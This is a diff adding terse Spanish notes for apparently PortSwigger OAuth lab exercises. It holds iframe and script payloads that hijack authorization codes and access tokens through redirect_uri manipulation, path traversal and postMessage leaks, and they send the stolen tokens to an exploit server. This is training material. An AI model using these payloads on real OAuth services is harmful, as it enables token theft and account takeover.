@@ -1,0 +1,28 @@
+/admin
+/robots.txt
+https://oauth.server.net/.well-known/openid-configuration
+https://oauth.net/.well-known/oauth-authorization-server
+
+si hay un campo redirect , pegar esto en el server como hijacking
+<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
+
+PathTraversal después de oauth-callback y nos redirecciona, buscar ruta para que la redirecciónsea posible
+<script>  
+	  if (!document.location.hash) {window.location='https://oauth-0a3000c0033e152eab8962bc02470016.oauth-server.net/auth?client_id=p4aru2o08aeczl7cyboy4&redirect_uri=https://0acd009f03a61536ab07643f00c30059.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0af10024039c15a8abc2633d01a90072.exploit-server.net/exploit&response_type=token&nonce=85375389&scope=openid%20profile%20email '} else {
+		 window.location = '/?'+document.location.hash.substr(1)}
+ </script>
+Después d ecoger access token e intercambiarlo con intercept on
+Cogemos el /me 
+Authorization: Bearer dasfwseddfsf --> cambiamos esto por el accesstoken
+
+
+PathTraversal a través de redirect uri, después de ver un iframe vulnerable en comment
+
+<iframe src="https://oauth-0a1000fb048cf5e2847e679f02a0009c.oauth-server.net/auth?client_id=c9vu5250794quwjt03e1k&redirect_uri=https://
+Oaad00ff0415f53684c86951003f0006.web-security-academy.net/oauth-callback/../post/comment/comment-
+form&response_type=token&nonce =- 284565886&scope=openid%20profile%20email"></iframe>
+<script>
+window.addEventListener('message', function(e) {
+fetch("/" + encodeURIComponent(e.data.data))
+}, false)
+</script>
